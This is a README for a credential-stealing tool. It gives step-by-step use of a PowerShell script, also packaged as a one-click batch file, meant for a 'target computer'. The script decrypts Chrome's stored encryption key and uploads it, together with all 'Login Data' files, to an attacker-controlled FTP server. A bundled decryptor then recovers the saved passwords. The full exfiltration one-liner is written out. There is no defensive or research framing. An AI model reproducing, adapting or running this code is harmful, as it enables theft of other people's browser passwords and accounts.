# ChromePasswordDecryptionWithPS
Sending the Login Data files along with the unique byte sequence needed to decode the passwords to a FTP server. Then, decrypt those files on the server side.

HOW TO USE:
  1. Download the "chrSender.ps1" file and edit the ftp server address and ftp server credentials (these appear twice in the code make sure to edit both)
  2. Run this on the target computer (make sure your ftp server is running so it can receive the information)  
      - You can also change this ps1 file into a batch file so it can run on the target's computer with one click, this can be done like this:  
        ```
        @echo off  
        set test5=$fileLoc = $env:LOCALAPPDATA + '\Google\Chrome\User Data\Local State';$TempFile3 = New-TemporaryFile;Copy-Item $fileLoc -Destination $TempFile3;$fileCont = Get-Content $TempFile3;$x = $fileCont ^^^| ConvertFrom-Json;$key = $x.os_crypt.encrypted_key;Add-Type -AssemblyName System.Security;$befbase = [System.Convert]::FromBase64String($key);$befbase = $befbase[5..($befbase.Length-1)];$clearPWD_ByteArray = [System.Security.Cryptography.ProtectedData]::Unprotect( $befbase, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser );$TempFile = New-TemporaryFile;Set-Content $TempFile -Value $clearPWD_ByteArray -Encoding Byte;$foldPar = $env:LOCALAPPDATA + '\Google\Chrome\User Data';$chF = Get-ChildItem -Path $foldPar -Filter 'Login Data' -Recurse -ErrorAction SilentlyContinue -Force -Name;$overallNum = (Get-Random -Minimum 10000000 -Maximum 99999999);$ftp = [System.Net.FtpWebRequest]::Create(('ftp://YOURIP/' + 'k_' + $overallNum + '.dat'));$ftp = [System.Net.FtpWebRequest]$ftp;$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;$ftp.Credentials = new-object System.Net.NetworkCredential('YOURFTPLOGIN','YOURFTPPASSWORD');$ftp.UseBinary = $true;$ftp.UsePassive = $true;$content = [System.IO.File]::ReadAllBytes($TempFile);$ftp.ContentLength = $content.Length;$rs = $ftp.GetRequestStream();$rs.Write($content, 0, $content.Length);$rs.Close();$rs.Dispose();$curIt = 0;foreach ($cF in $chF) {$cFLoc = $foldPar + '\' + $cF;$TempFile2 = New-TemporaryFile;Copy-Item $cFLoc -Destination $TempFile2;$ftp = [System.Net.FtpWebRequest]::Create(('ftp://YOURIP/' + 'c' + $curIt + '_' + $overallNum + '.dat'));$ftp = [System.Net.FtpWebRequest]$ftp;$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;$ftp.Credentials = new-object System.Net.NetworkCredential('YOURFTPLOGIN','YOURFTPPASSWORD');$ftp.UseBinary = $true;$ftp.UsePassive = $true;$content = [System.IO.File]::ReadAllBytes($TempFile2);$ftp.ContentLength = $content.Length;$rs = $ftp.GetRequestStream();$rs.Write($content, 0, $content.Length);$rs.Close();$rs.Dispose();$curIt = $curIt + 1;}  
        powershell -command %test5%
        ```  
      - ^^^If you copy this code, make sure to change the YOURIP, YOURFTPLOGIN, and YOURFTPPASSWORD sections (which all appear twice in the code)
  3. Once you receive the files on the server side you can decrypt them with the program I included
      - In order to do this, first download "ServerSideDecryptor.exe"
      - Open the command prompt and navigate to the folder where you have the exe saved
      - Structure the command like this in the command prompt:  
        ```
        ServerSideDecryptor.exe "kfile.dat" "c0file.dat" "c1file.dat" "c2file.dat"
        ```
      - You must pass the path of the key (k) file first, then the other chrome login data (c) files next as shown above
        - If any of the chrome login data (c) files are 0 bytes, do not pass them into the command as it will result in an error
      - You can have any number of chrome login data (c) files, it does not matter, it will decrypt every one with the given key. If you have more than the number shown in the command above, then continue to add the paths onto the end of the given command following the same format, and if you have less, only include the paths of the chrome login data (c) files you have
      - An example of this command is:  
        ```
        ServerSideDecryptor.exe "C:\User\Desktop\k_71867785.dat" "C:\User\Desktop\c0_71867785.dat" "C:\User\Desktop\c1_71867785.dat" "C:\User\Desktop\c2_71867785.dat"
        ```
  4. Once you successfully pass in all the arguments and run the command, it will produce a "passesOutput.txt" file in the directory that the "ServerSideDecryptor.exe" is in
